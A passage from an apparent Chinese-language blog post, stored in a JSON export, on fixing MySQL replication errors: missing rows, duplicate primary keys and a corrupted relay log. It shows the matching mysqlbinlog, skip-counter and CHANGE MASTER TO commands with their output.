slave;</span><br><span class=\"line\">Query OK, 0 rows affected (0.00 sec)</span><br><span class=\"line\"></span><br><span class=\"line\">mysql&gt; show slave status\\G;</span><br><span class=\"line\">&#x2026;&#x2026;</span><br><span class=\"line\">Slave_IO_Running: Yes</span><br><span class=\"line\">Slave_SQL_Running: Yes</span><br><span class=\"line\">&#x2026;&#x2026;</span><br><span class=\"line\">mysql&gt; select * from t1 <span class=\"built_in\">where</span> id=2;</span><br></pre></td></tr></table></figure></p>\n<p>&#x5728;master&#x4E0A;&#x548C;slave&#x4E0A;&#x518D;&#x5206;&#x522B;&#x786E;&#x8BA4;&#x4E00;&#x4E0B;&#x3002;</p>\n<hr>\n<h3 id=\"&#x66F4;&#x65B0;&#x4E22;&#x5931;\"><a href=\"#&#x66F4;&#x65B0;&#x4E22;&#x5931;\" class=\"headerlink\" title=\"&#x66F4;&#x65B0;&#x4E22;&#x5931;\"></a>&#x66F4;&#x65B0;&#x4E22;&#x5931;</h3><p>&#x5728;master&#x4E0A;&#x66F4;&#x65B0;&#x4E00;&#x6761;&#x8BB0;&#x5F55;&#xFF0C;&#x800C;slave&#x4E0A;&#x627E;&#x4E0D;&#x5230;&#xFF0C;&#x4E22;&#x5931;&#x4E86;&#x6570;&#x636E;&#x3002;<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">Last_SQL_Error: Could not execute Update_rows event on table hcy.t1; </span><br><span class=\"line\">Can<span class=\"string\">&apos;t find record in &apos;</span>t1<span class=\"string\">&apos;, </span><br><span class=\"line\">Error_code: 1032; </span><br><span class=\"line\">handler error HA_ERR_KEY_NOT_FOUND; </span><br><span class=\"line\">the event&apos;</span>s master <span class=\"built_in\">log</span> mysql-bin.000010, end_<span class=\"built_in\">log</span>_pos 794</span><br></pre></td></tr></table></figure></p>\n<p>&#x89E3;&#x51B3;&#x65B9;&#x6CD5;&#xFF1A;</p>\n<p>&#x5728;master&#x4E0A;&#xFF0C;&#x7528;mysqlbinlog &#x5206;&#x6790;&#x4E0B;&#x51FA;&#x9519;&#x7684;binlog&#x65E5;&#x5FD7;&#x5728;&#x5E72;&#x4EC0;&#x4E48;&#x3002;<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">/usr/<span class=\"built_in\">local</span>/mysql/bin/mysqlbinlog --no-defaults -v -v --base64-output=DECODE-ROWS mysql-bin.000010 | grep -A <span class=\"string\">&apos;10&apos;</span> 794</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">#120302 12:08:36 server id 22  end_log_pos 794  Update_rows: table id 33 flags: STMT_END_F</span></span><br><span class=\"line\"><span class=\"comment\">### UPDATE hcy.t1</span></span><br><span class=\"line\"><span class=\"comment\">### WHERE</span></span><br><span class=\"line\"><span class=\"comment\">###   @1=2 /* INT meta=0 nullable=0 is_null=0 */</span></span><br><span class=\"line\"><span class=\"comment\">###   @2=&apos;bbc&apos; /* STRING(4) meta=65028 nullable=1 is_null=0 */</span></span><br><span class=\"line\"><span class=\"comment\">### SET</span></span><br><span class=\"line\"><span class=\"comment\">###   @1=2 /* INT meta=0 nullable=0 is_null=0 */</span></span><br><span class=\"line\"><span class=\"comment\">###   @2=&apos;BTV&apos; /* STRING(4) meta=65028 nullable=1 is_null=0 */</span></span><br><span class=\"line\"><span class=\"comment\"># at 794</span></span><br><span class=\"line\"><span class=\"comment\">#120302 12:08:36 server id 22  end_log_pos 821  Xid = 60</span></span><br><span class=\"line\">COMMIT/*!*/;</span><br><span class=\"line\">DELIMITER ;</span><br><span class=\"line\"><span class=\"comment\"># End of log file</span></span><br><span class=\"line\">ROLLBACK /* added by mysqlbinlog */;</span><br><span class=\"line\">/*!50003 SET COMPLETION_TYPE=@OLD_COMPLETION_TYPE*/;</span><br></pre></td></tr></table></figure></p>\n<p>&#x5728;slave&#x4E0A;&#xFF0C;&#x67E5;&#x627E;&#x4E0B;&#x66F4;&#x65B0;&#x540E;&#x7684;&#x90A3;&#x6761;&#x8BB0;&#x5F55;&#xFF0C;&#x5E94;&#x8BE5;&#x662F;&#x4E0D;&#x5B58;&#x5728;&#x7684;&#x3002;<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">mysql&gt; select * from t1 <span class=\"built_in\">where</span> id=2;</span><br><span class=\"line\">Empty <span class=\"built_in\">set</span> (0.00 sec)</span><br></pre></td></tr></table></figure></p>\n<p>&#x7136;&#x540E;&#x518D;&#x5230;master&#x67E5;&#x770B;<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">mysql&gt; select * from t1 <span class=\"built_in\">where</span> id=2;</span><br><span class=\"line\">+----+------+</span><br><span class=\"line\">| id | name |</span><br><span class=\"line\">+----+------+</span><br><span class=\"line\">|  2 | BTV  | </span><br><span class=\"line\">+----+------+</span><br><span class=\"line\">1 row <span class=\"keyword\">in</span> <span class=\"built_in\">set</span> (0.00 sec)</span><br></pre></td></tr></table></figure></p>\n<p>&#x628A;&#x4E22;&#x5931;&#x7684;&#x6570;&#x636E;&#x5728;slave&#x4E0A;&#x586B;&#x8865;&#xFF0C;&#x7136;&#x540E;&#x8DF3;&#x8FC7;&#x62A5;&#x9519;&#x5373;&#x53EF;&#x3002;<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">mysql&gt; insert into t1 values (2,<span class=\"string\">&apos;BTV&apos;</span>);</span><br><span class=\"line\">Query OK, 1 row affected (0.00 sec)</span><br><span class=\"line\"></span><br><span class=\"line\">mysql&gt; select * from t1 <span class=\"built_in\">where</span> id=2;    </span><br><span class=\"line\">+----+------+</span><br><span class=\"line\">| id | name |</span><br><span class=\"line\">+----+------+</span><br><span class=\"line\">|  2 | BTV  | </span><br><span class=\"line\">+----+------+</span><br><span class=\"line\">1 row <span class=\"keyword\">in</span> <span class=\"built_in\">set</span> (0.00 sec)</span><br><span class=\"line\"></span><br><span class=\"line\">mysql&gt; stop slave ;<span class=\"built_in\">set</span> global sql_slave_skip_counter=1;start slave;</span><br><span class=\"line\">Query OK, 0 rows affected (0.01 sec)</span><br><span class=\"line\">Query OK, 0 rows affected (0.00 sec)</span><br><span class=\"line\">Query OK, 0 rows affected (0.00 sec)</span><br><span class=\"line\"></span><br><span class=\"line\">mysql&gt; show slave status\\G;</span><br><span class=\"line\">&#x2026;&#x2026;</span><br><span class=\"line\"> Slave_IO_Running: Yes</span><br><span class=\"line\"> Slave_SQL_Running: Yes</span><br><span class=\"line\">&#x2026;&#x2026;</span><br></pre></td></tr></table></figure></p>\n<hr>\n<h3 id=\"&#x4E2D;&#x7EE7;&#x65E5;&#x5FD7;&#x635F;&#x574F;\"><a href=\"#&#x4E2D;&#x7EE7;&#x65E5;&#x5FD7;&#x635F;&#x574F;\" class=\"headerlink\" title=\"&#x4E2D;&#x7EE7;&#x65E5;&#x5FD7;&#x635F;&#x574F;\"></a>&#x4E2D;&#x7EE7;&#x65E5;&#x5FD7;&#x635F;&#x574F;</h3><p>slave&#x7684;&#x4E2D;&#x7EE7;&#x65E5;&#x5FD7;relay-bin&#x635F;&#x574F;&#x3002;<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">Last_SQL_Error: Error initializing relay <span class=\"built_in\">log</span> position: I/O error reading the header from the binary <span class=\"built_in\">log</span></span><br><span class=\"line\">Last_SQL_Error: Error initializing relay <span class=\"built_in\">log</span> position: Binlog has bad magic number;  </span><br><span class=\"line\">It<span class=\"string\">&apos;s not a binary log file that can be used by  this version of MySQL</span></span><br></pre></td></tr></table></figure></p>\n<h4 id=\"1&#x3001;&#x624B;&#x5DE5;&#x4FEE;&#x590D;\"><a href=\"#1&#x3001;&#x624B;&#x5DE5;&#x4FEE;&#x590D;\" class=\"headerlink\" title=\"1&#x3001;&#x624B;&#x5DE5;&#x4FEE;&#x590D;\"></a>1&#x3001;&#x624B;&#x5DE5;&#x4FEE;&#x590D;</h4><p>&#x89E3;&#x51B3;&#x65B9;&#x6CD5;&#xFF1A;&#x627E;&#x5230;&#x540C;&#x6B65;&#x7684;binlog&#x548C;POS&#x70B9;&#xFF0C;&#x7136;&#x540E;&#x91CD;&#x65B0;&#x505A;&#x540C;&#x6B65;&#xFF0C;&#x8FD9;&#x6837;&#x5C31;&#x53EF;&#x4EE5;&#x6709;&#x65B0;&#x7684;&#x4E2D;&#x7EE7;&#x65E5;&#x503C;&#x4E86;&#x3002;</p>\n<p>&#x4F8B;&#x5B50;&#xFF1A;<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">mysql&gt; show slave status\\G;</span><br><span class=\"line\">*************************** 1. row ***************************</span><br><span class=\"line\">              Master_Log_File: mysql-bin.000010</span><br><span class=\"line\">          Read_Master_Log_Pos: 1191</span><br><span class=\"line\">               Relay_Log_File: vm02-relay-bin.000005</span><br><span class=\"line\">                Relay_Log_Pos: 253</span><br><span class=\"line\">        Relay_Master_Log_File: mysql-bin.000010</span><br><span class=\"line\">             Slave_IO_Running: Yes</span><br><span class=\"line\">            Slave_SQL_Running: No</span><br><span class=\"line\">              Replicate_Do_DB: </span><br><span class=\"line\">          Replicate_Ignore_DB: </span><br><span class=\"line\">           Replicate_Do_Table: </span><br><span class=\"line\">       Replicate_Ignore_Table: </span><br><span class=\"line\">      Replicate_Wild_Do_Table: </span><br><span class=\"line\">  Replicate_Wild_Ignore_Table: </span><br><span class=\"line\">                   Last_Errno: 1593</span><br><span class=\"line\">                   Last_Error: Error initializing relay <span class=\"built_in\">log</span> position: I/O error reading the header from the binary <span class=\"built_in\">log</span></span><br><span class=\"line\">                 Skip_Counter: 1</span><br><span class=\"line\">          Exec_Master_Log_Pos: 821</span><br><span class=\"line\"></span><br><span class=\"line\">Slave_IO_Running &#xFF1A;&#x63A5;&#x6536;master&#x7684;binlog&#x4FE1;&#x606F;</span><br><span class=\"line\">                   Master_Log_File</span><br><span class=\"line\">                   Read_Master_Log_Pos</span><br><span class=\"line\"></span><br><span class=\"line\">Slave_SQL_Running&#xFF1A;&#x6267;&#x884C;&#x5199;&#x64CD;&#x4F5C;</span><br><span class=\"line\">                   Relay_Master_Log_File</span><br><span class=\"line\">                   Exec_Master_Log_Pos</span><br></pre></td></tr></table></figure></p>\n<p>&#x4EE5;&#x6267;&#x884C;&#x5199;&#x7684;binlog&#x548C;POS&#x70B9;&#x4E3A;&#x51C6;&#x3002;<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">Relay_Master_Log_File: mysql-bin.000010</span><br><span class=\"line\">Exec_Master_Log_Pos: 821</span><br></pre></td></tr></table></figure></p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">mysql&gt; stop slave;</span><br><span class=\"line\">Query OK, 0 rows affected (0.01 sec)</span><br><span class=\"line\"></span><br><span class=\"line\">mysql&gt; CHANGE MASTER TO MASTER_LOG_FILE=<span class=\"string\">&apos;mysql-bin.000010&apos;</span>,MASTER_LOG_POS=821;</span><br><span class=\"line\">Query OK, 0 rows affected (0.01 sec)</span><br><span class=\"line\"></span><br><span class=\"line\">mysql&gt; start slave;</span><br><span class=\"line\">Query OK, 0 rows affected (0.00 sec)</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">mysql&gt; show slave status\\G;</span><br><span class=\"line\">*************************** 1. row ***************************</span><br><span class=\"line\">               Slave_IO_State: Waiting <span class=\"keyword\">for</span> master to send event</span><br><span class=\"line\">                  Master_Host: 192.168.8.22</span><br><span class=\"line\">                  Master_User: repl</span><br><span class=\"line\">                  Master_Port: 3306</span><br><span class=\"line\">                Connect_Retry: 10</span><br><span class=\"line\">              Master_Log_File: mysql-bin.000010</span><br><span class=\"line\">          Read_Master_Log_Pos: 1191</span><br><span class=\"line\">               Relay_Log_File: vm02-relay-bin.000002</span><br><span class=\"line\">                Relay_Log_Pos: 623</span><br><span class=\"line\">        Relay_Master_Log_File: mysql-bin.000010</span><br><span class=\"line\">             Slave_IO_Running: Yes</span><br><span class=\"line\">            Slave_SQL_Running: Yes</span><br><span class=\"line\">              Replicate_Do_DB: </span><br><span class=\"line\">          Replicate_Ignore_DB: </span><br><span class=\"line\">           Replicate_Do_Table: </span><br><span class=\"line\">       Replicate_Ignore_Table: </span><br><span class=\"line\">      Replicate_Wild_Do_Table: </span><br><span class=\"line\">  Replicate_Wild_Ignore_Table: </span><br><span class=\"line\">                   Last_Errno: 0</span><br><span class=\"line\">                   Last_Error: </span><br><span class=\"line\">                 Skip_Counter: 0</span><br><span class=\"line\">          Exec_Master_Log_Pos: 1191</span><br><span class=\"line\">              Relay_Log_Space: 778</span><br><span class=\"line\">              Until_Condition: None</span><br><span class=\"line\">               Until_Log_File: </span><br><span class=\"line\">                Until_Log_Pos: 0</span><br><span class=\"line\">           Master_SSL_Allowed: No</span><br><span class=\"line\">           Master_SSL_CA_File: </span><br><span class=\"line\">           Master_SSL_CA_Path: </span><br><span class=\"line\">              Master_SSL_Cert: </span><br><span class=\"line\">            Master_SSL_Cipher: </span><br><span class=\"line\">               Master_SSL_Key: </span><br><span class=\"line\">        Seconds_Behind_Master: 0</span><br><span class=\"line\">Master_SSL_Verify_Server_Cert: No</span><br><span class=\"line\">                Last_IO_Errno: 0</span><br><span class=\"line\">                Last_IO_Error: </span><br><span class=\"line\">               Last_SQL_Errno: 0</span><br><span class=\"line\">               Last_SQL_Error:</span><br></pre></td></tr></table></figure>\n<h4 id=\"2&#x3001;Ibbackup\"><a href=\"#2&#x3001;Ibbackup\" class=\"headerlink\" title=\"2&#x3001;Ibbackup\"></a>2&#x3001;Ibbackup</h4><p>&#x5404;&#x79CD;&#x5927;&#x62DB;&#x90FD;&#x7528;&#x4E0A;&#x4E86;&#xFF0C;&#x65E0;&#x5948;slave&#x6570;&#x636E;&#x4E22;&#x5931;&#x8FC7;&#x591A;&#xFF0C;ibbackup&#xFF08;&#x9700;&#x8981;&#x94F6;&#x5B50;&#xFF09;&#x8BE5;&#x4F60;&#x767B;&#x573A;&#x4E86;&#x3002;</p>\n<p>Ibbackup&#x70ED;&#x5907;&#x4EFD;&#x5DE5;&#x5177;&#xFF0C;&#x662F;&#x4ED8;&#x8D39;&#x7684;&#x3002;xtrabackup&#x662F;&#x514D;&#x8D39;&#x7684;&#xFF0C;&#x529F;&#x80FD;&#x4E0A;&#x4E00;&#x6837;&#x3002;</p>\n<p>Ibbackup&#x5907;&#x4EFD;&#x671F;&#x95F4;&#x4E0D;&#x9501;&#x8868;&#xFF0C;&#x5907;&#x4EFD;&#x65F6;&#x5F00;&#x542F;&#x4E00;&#x4E2A;&#x4E8B;&#x52A1;&#xFF08;&#x76F8;&#x5F53;&#x4E8E;&#x505A;&#x4E00;&#x4E2A;&#x5FEB;&#x7167;&#xFF09;&#xFF0C;&#x7136;&#x540E;&#x4F1A;&#x8BB0;&#x5F55;&#x4E00;&#x4E2A;&#x70B9;&#xFF0C;&#x4E4B;&#x540E;&#x6570;&#x636E;&#x7684;&#x66F4;&#x6539;&#x4FDD;&#x5B58;&#x5728;ibbackup_logfile&#x6587;&#x4EF6;&#x91CC;&#xFF0C;&#x6062;&#x590D;&#x65F6;&#x628A;ibbackup_logfile &#x53D8;&#x5316;&#x7684;&#x6570;&#x636E;&#x518D;&#x5199;&#x5165;&#x5230;ibdata&#x91CC;&#x3002;</p>\n<p>Ibbackup &#x53EA;&#x5907;&#x4EFD;&#x6570;&#x636E;&#xFF08; ibdata&#x3001;.ibd &#xFF09;&#xFF0C;&#x8868;&#x7ED3;&#x6784;.frm&#x4E0D;&#x5907;&#x4EFD;&#x3002;</p>\n","excerpt":"<h3 id=\"&#x524D;&#x8A00;\"><a href=\"#&#x524D;&#x8A00;\" class=\"headerlink\" title=\"&#x524D;&#x8A00;\"></a>&#x524D;&#x8A00;</h3><p>&#x5728;&#x53D1;&#x751F;&#x6545;&#x969C;&#x5207;&#x6362;&#x540E;&#xFF0C;&#x7ECF;&#x5E38;&#x9047;&#x5230;&#x7684;&#x95EE;&#x9898;&#x5C31;&#x662F;&#x540C;&#x6B65;&#x62A5;&#x9519;&#xFF0C;&#x4E0B;&#x9762;&#x662F;&#x6700;&#x8FD1;&#x6536;&#x96C6;&#x7684;&#x62A5;&#x9519;&#x4FE1;&#x606F;&#x3002;</p>\n<hr>\n<h3 id=\"&#x5220;&#x9664;&#x5931;&#x8D25;\"><a href=\"#&#x5220;&#x9664;&#x5931;&#x8D25;\" class=\"headerlink\" title=\"&#x5220;&#x9664;&#x5931;&#x8D25;\"></a>&#x5220;&#x9664;&#x5931;&#x8D25;</h3><p><strong>&#x5728;master&#x4E0A;&#x5220;&#x9664;&#x4E00;&#x6761;&#x8BB0;&#x5F55;&#xFF0C;&#x800C;slave&#x4E0A;&#x627E;&#x4E0D;&#x5230;</strong><br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">Last_SQL_Error: Could not execute Delete_rows event on table hcy.t1; </span><br><span class=\"line\">Can<span class=\"string\">&apos;t find record in &apos;</span>t1<span class=\"string\">&apos;, </span><br><span class=\"line\">Error_code: 1032; handler error HA_ERR_KEY_NOT_FOUND; </span><br><span class=\"line\">the event&apos;</span>s master <span class=\"built_in\">log</span> mysql-bin.000006, end_<span class=\"built_in\">log</span>_pos 254</span><br></pre></td></tr></table></figure></p>\n<p>&#x89E3;&#x51B3;&#x65B9;&#x6CD5;&#xFF1A;master&#x8981;&#x5220;&#x9664;&#x4E00;&#x6761;&#x8BB0;&#x5F55;&#xFF0C;&#x800C;slave&#x4E0A;&#x627E;&#x4E0D;&#x5230;&#x62A5;&#x9519;&#xFF0C;&#x8FD9;&#x79CD;&#x60C5;&#x51B5;&#x4E3B;&#x90FD;&#x5DF2;&#x7ECF;&#x5220;&#x9664;&#x4E86;&#xFF0C;&#x90A3;&#x4E48;&#x4ECE;&#x673A;&#x53EF;&#x4EE5;&#x76F4;&#x63A5;&#x8DF3;&#x8FC7;&#x3002;<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">stop slave;</span><br><span class=\"line\"><span class=\"built_in\">set</span> global sql_slave_skip_counter=1;</span><br><span class=\"line\">start slave;</span><br></pre></td></tr></table></figure></p>\n<p>&#x5982;&#x679C;&#x8FD9;&#x79CD;&#x60C5;&#x51B5;&#x5F88;&#x591A;&#xFF0C;&#x9700;&#x8981;&#x9488;&#x5BF9;&#x8FD9;&#x79CD;&#x9519;&#x8BEF;&#x4E13;&#x95E8;&#x5199;&#x76F8;&#x5173;&#x811A;&#x672C;&#x3002;</p>","more":"<hr>\n<h3 id=\"&#x4E3B;&#x952E;&#x91CD;&#x590D;\"><a href=\"#&#x4E3B;&#x952E;&#x91CD;&#x590D;\" class=\"headerlink\" title=\"&#x4E3B;&#x952E;&#x91CD;&#x590D;\"></a>&#x4E3B;&#x952E;&#x91CD;&#x590D;</h3><p>&#x5728;slave&#x5DF2;&#x7ECF;&#x6709;&#x8BE5;&#x8BB0;&#x5F55;&#xFF0C;&#x53C8;&#x5728;master&#x4E0A;&#x63D2;&#x5165;&#x4E86;&#x540C;&#x4E00;&#x6761;&#x8BB0;&#x5F55;&#x3002;<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">Last_SQL_Error: Could not execute Write_rows event on table hcy.t1; </span><br><span class=\"line\">Duplicate entry <span class=\"string\">&apos;2&apos;</span> <span class=\"keyword\">for</span> key <span class=\"string\">&apos;PRIMARY&apos;</span>, </span><br><span class=\"line\">Error_code: 1062; </span><br><span class=\"line\">handler error HA_ERR_FOUND_DUPP_KEY; the event<span class=\"string\">&apos;s master log mysql-bin.000006, end_log_pos 924</span></span><br></pre></td></tr></table></figure></p>\n<p>&#x89E3;&#x51B3;&#x65B9;&#x6CD5;&#xFF1A;</p>\n<p>&#x5728;slave&#x4E0A;&#x7528;desc hcy.t1; &#x5148;&#x770B;&#x4E0B;&#x8868;&#x7ED3;&#x6784;&#xFF1A;<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">mysql&gt; desc hcy.t1;</span><br><span class=\"line\">+-------+---------+------+-----+---------+-------+</span><br><span class=\"line\">| Field | Type    | Null | Key | Default | Extra |</span><br><span class=\"line\">+-------+---------+------+-----+---------+-------+</span><br><span class=\"line\">| id    | int(11) | NO   | PRI | 0       |       | </span><br><span class=\"line\">| name  | char(4) | YES  |     | NULL    |       | </span><br><span class=\"line\">+-------+---------+------+-----+---------+-------+</span><br></pre></td></tr></table></figure></p>\n<p>&#x5220;&#x9664;&#x91CD;&#x590D;&#x7684;&#x4E3B;&#x952E;<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">mysql&gt; delete from t1 <span class=\"built_in\">where</span> id=2;</span><br><span class=\"line\">Query OK, 1 row affected (0.00 sec)</span><br><span class=\"line\"></span><br><span class=\"line\">mysql&gt; start slave;</span><br><span class=\"line\">Query OK, 0 rows affected (0.00 sec)</span><br><span class=\"line\"></span><br><span class=\"line\">mysql&gt; show slave status\\G;</span><br><span class=\"line\">&#x2026;&#x2026;</span><br><span class=\"line\">Slave_IO_Running: Yes</span><br><span class=\"line\">Slave_SQL_Running: Yes</span><br><span class=\"line\">&#x2026;&#x2026;</span><br><span class=\"line\">mysql&gt; select * from t1 <span class=\"built_in\">where</span> id=2;</span><br></pre></td></tr></table></figure></p>\n<p>&#x5728;master&#x4E0A;&#x548C;slave&#x4E0A;&#x518D;&#x5206;&#x522B;&#x786E;&#x8BA4;&#x4E00;&#x4E0B;&#x3002;</p>\n<hr>\n<h3 id=\"&#x66F4;&#x65B0;&#x4E22;&#x5931;\"><a href=\"#&#x66F4;&#x65B0;&#x4E22;&#x5931;\" class=\"headerlink\" title=\"&#x66F4;&#x65B0;&#x4E22;&#x5931;\"></a>&#x66F4;&#x65B0;&#x4E22;&#x5931;</h3><p>&#x5728;master&#x4E0A;&#x66F4;&#x65B0;&#x4E00;&#x6761;&#x8BB0;&#x5F55;&#xFF0C;&#x800C;slave&#x4E0A;&#x627E;&#x4E0D;&#x5230;&#xFF0C;&#x4E22;&#x5931;&#x4E86;&#x6570;&#x636E;&#x3002;<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">Last_SQL_Error: Could not execute Update_rows event on table hcy.t1; </span><br><span class=\"line\">Can<span class=\"string\">&apos;t find record in &apos;</span>t1<span class=\"string\">&apos;, </span><br><span class=\"line\">Error_code: 1032; </span><br><span class=\"line\">handler error HA_ERR_KEY_NOT_FOUND; </span><br><span class=\"line\">the event&apos;</span>s master <span class=\"built_in\">log</span> mysql-bin.000010, end_<span class=\"built_in\">log</span>_pos 794</span><br></pre></td></tr></table></figure></p>\n<p>&#x89E3;&#x51B3;&#x65B9;&#x6CD5;&#xFF1A;</p>\n<p>&#x5728;master&#x4E0A;&#xFF0C;&#x7528;mysqlbinlog &#x5206;&#x6790;&#x4E0B;&#x51FA;&#x9519;&#x7684;binlog&#x65E5;&#x5FD7;&#x5728;&#x5E72;&#x4EC0;&#x4E48;&#x3002;<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">/usr/<span class=\"built_in\">local</span>/mysql/bin/mysqlbinlog --no-defaults -v -v --base64-output=DECODE-ROWS mysql-bin.000010 | grep -A <span class=\"string\">&apos;10&apos;</span> 794</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">#120302 12:08:36 server id 22  end_log_pos 794  Update_rows: table id 33 flags: STMT_END_F</span></span><br><span class=\"line\"><span class=\"comment\">### UPDATE hcy.t1</span></span><br><span class=\"line\"><span class=\"comment\">### WHERE</span></span><br><span class=\"line\"><span class=\"comment\">###   @1=2 /* INT meta=0 nullable=0 is_null=0 */</span></span><br><span class=\"line\"><span class=\"comment\">###   @2=&apos;bbc&apos; /* STRING(4) meta=65028 nullable=1 is_null=0 */</span></span><br><span class=\"line\"><span class=\"comment\">### SET</span></span><br><span 